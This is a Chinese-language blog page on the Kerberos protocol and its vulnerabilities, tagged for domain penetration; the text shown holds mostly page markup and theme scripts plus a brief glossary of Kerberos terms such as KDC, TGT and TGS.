<!DOCTYPE html>
<html lang="zh-CN">
    <!-- title -->


    

<!-- keywords -->



<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="Drunkmars">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="Drunkmars">
    
        <meta name="keywords" content="Drunkmars,Drunkmars-theme,Drunkmars-blog">
    
    <meta name="description" content="">
    <meta name="description" content="概念​ | DC              | 域控                       || KDC             | 密钥分发中心，域控担任     || AD              | 活动目录，包含与用户数据库 || AS              | Kerberos认证服务           || TGT             | AS分发，TGT认证权证">
<meta property="og:type" content="article">
<meta property="og:title" content="kerberos协议&amp;漏洞">
<meta property="og:url" content="http://example.com/2021/04/06/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Drunkmars">
<meta property="og:description" content="概念​ | DC              | 域控                       || KDC             | 密钥分发中心，域控担任     || AD              | 活动目录，包含与用户数据库 || AS              | Kerberos认证服务           || TGT             | AS分发，TGT认证权证">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/9a2ec22f53a28efd17bf0a8d298011f3.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c7c3cda2418945a66e2280cd4993e29e.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/15b8d9bb93995137ffc4ef172abbd3e6.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fc59a89ef335a7a40849a7b47723418f.jpeg">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ee7f0aaceaa0978c09ccb33d0ce90e40.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/5efa1f10962c15913294735e2cdb1714.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c02fa8bc494fcce131e171e4b022ea0d.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/818575d7697eab236d09c44f055ec8bf.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/3c4a2df22648ce229ad51df99c84ecd7.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/be4c7ceb55b306da945a484b1a20e089.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/b3950c86772def3136dd8d72b1426cae.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/df6d133c4d0b7c1114b6f6b0b3c0b9da.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/669381747493bdc00a432e07189d8d13.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/f246613b27b5848cb09ec1dafd103c93.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/11316c8e9906eb7af3056780a4367f14.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/7f0d73f92b21f61627deee0c01ff7196.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/4dc180a7a281b9d1a7452812c0e05c56.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/77a99082f73b40c79eebb569b8c91c7c.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/a056fd59503431a0cf4e22f52bbab7f2.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/a8f728776b1b9c57f895fc43d67790be.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/0234fc1db59b4ae90219e23766111edc.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c20fc7736909c4e361b29e671a663d13.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/aff8da1884a284235fc3a5733dd50983.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6f34cb6eac31f2c7f3123aadb539f816.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/a92e1d19c7bce368c0e529604fbbe15f.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/f52a49dc9dd9d12fd20243275a1c34ba.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/0910c87762ffaf7d54060c0435a628c4.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/1ba77627d1dce06e2906a83b8bc36403.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/d8b2884e4a324e31094f90cffdfc4cad.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/80bf1f339a2fe8f62742cfe6324b9270.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/7dc6755164513cc9b1552ca273b0c4a8.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/30c77331cf617ed4a120e9b13fa32a9f.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/95378442907abdfd7719d7d172c4ce67.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/1dbc38ccf5121ef1ca7d3ea6bd9da343.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/cafac45d8e89b32073d8b6734e0dfece.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/83ac789aef908198aaba33ab1764efd2.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/75cce52616800bccd645a31b6ad1083b.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6e001ff1599ac6d1cb049a47b38bea62.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fe20190dac9bed68ff7d220cae71d558.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ec8da490e415f85d77c48cfc8b100e8c.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/8afb272f858eaba8b2f0962e1dba1cc3.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/708a10f656614429e68c4f8d3311ae12.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/9c993f9bedb14e7b7bd115e59b86c966.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fc05c91abe549a89884bbcdf1082d865.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/175a766c924bc6855dd30cdd2f31e061.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/bf586e1036a8801ce693c89cc5bc354a.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c6fcd574aff17010471d5e2969455d6a.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/151fb6975352c08d574e206b6b4882c7.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/608b66a74f0cfdf54b381398279e2dbf.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6cec7f558f9466978f56f4cbf337bc9d.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/3e0e2fb37d6d7f0ccec809a754cb1b13.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6f9a3bacc28b732a0b88beec4d515e8b.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/21f6fd3c641b70f2eb2c189332c459ce.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/243147d5732d4942e549c4d1d7227707.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/dcc3fcee272ec5c44380a6108a718d74.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6a5c684067f4c164404b41aaccd68522.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/40664925e2104cb2cd2973e496e1acfc.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ab60aaa3ce99adafec74f756562104ba.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/b0ebd3b10099c34949cceca1f858e298.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/0f2a1eb4be699ad7d0e6b7debcb18b02.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/27f74d3ee890557928435556614c8448.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/218a5d25a138bc6f02d0ed29a0f8b0f9.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6b05fb6881d50f6dbe9e5a402bfe7ea3.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/1c3820c6f250dd2c1491dcbd5c1c0cb6.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/27ed3bac0576d3839be5203cf1f3f406.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fbd9bf7eb7a65c51758409253cf51415.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/16a25af15878d850cebdf9c63c8d86dc.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/32f950c08b5145cd62460ae6c1a45553.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/3a0223b33a18dfef9d228745ada6d32d.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/e7a8bb2fe4bfc13dee77c093401112ee.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fbd724d3a2c9f63620b4b7e21b70d505.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/5e44c8d6d02daf7437282a2f3a9e2c1c.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6ba95a1778b4480e674af0938aa70e5d.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/587cd654d9ac8e32e0f510ba59fafd99.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/17d180feaf9bffaeaba4544c12d17cac.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ea9f392bfdf55a024a0e2d75c7d7652f.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/97217de84f6d34bc0569a4a859dd957e.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/d04187e7f72174ca30bd5ba20a68dfbd.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/39f7ac3e4f69ce5596d69d552dec45ce.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/73e15ab64ec028e4471a609992ca4951.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/1b81e56b29cfd70e8838071ff1a72e69.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/5de75872895a6bdc89ffd782997f4dea.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/2dad8c3aec6b396cb8557870cea4052d.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/9c1d6dd86dacfd8c0def0e6ed33a6ac4.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6d328fdb9a598c6fd0b4eedb56035e30.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/bdd3ca64136c713f9055817799d214e2.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/5a274eca4675dd9fc71fcfc755ea9714.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6463b452e46691e75357544feb13ab94.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ab4f46606fcd4c0c5cdc6ae58cc52dde.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/2467ca4c2db473eecf889bf8960c7314.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c4634c1a3f7d9b089f13f50b6e7139d6.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/723d8e4bc3a17bb2edac4614e249c994.png">
<meta property="og:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ea07d8cb64b6c712c900515fccf959a6.png">
<meta property="article:published_time" content="2021-04-05T16:00:00.000Z">
<meta property="article:modified_time" content="2021-05-27T12:36:33.488Z">
<meta property="article:author" content="Drunkmars">
<meta property="article:tag" content="private">
<meta property="article:tag" content="内网渗透">
<meta property="article:tag" content="kerberos">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/9a2ec22f53a28efd17bf0a8d298011f3.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/Drunkmars.ico">
    
    <title>kerberos协议&amp;漏洞 · Drunkmars&#39;s Blog</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
<meta name="generator" content="Hexo 5.4.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu">
        
            
                <div style="padding-left: 1px;">&#xe775;</div>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>Drunkmars's Blog</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">Drunkmars&#39;s Blog</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">kerberos协议&漏洞</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden">
        
        
            <div>&#xe639;</div>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                kerberos协议&漏洞
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
    
        <a class="post-tag" href="javascript:void(0);" data-tags="private">private</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags="内网渗透">内网渗透</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags="kerberos">kerberos</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags="域渗透">域渗透</a>
    
</div>

                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">9.6k</span>阅读时长: <span class="post-count reading-time">37 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2021/04/06</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>​</p>
<p>| <strong>DC</strong>              | 域控                       |<br>| <strong>KDC</strong>             | 密钥分发中心，域控担任     |<br>| <strong>AD</strong>              | 活动目录，包含与用户数据库 |<br>| <strong>AS</strong>              | Kerberos认证服务           |<br>| <strong>TGT</strong>             | AS分发，TGT认证权证        |<br>| <strong>TGS</strong>             | 票据授予服务               |<br>| <strong>ST</strong>              | ST服务票据，由TGS服务发送  |</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/9a2ec22f53a28efd17bf0a8d298011f3.png"></p>
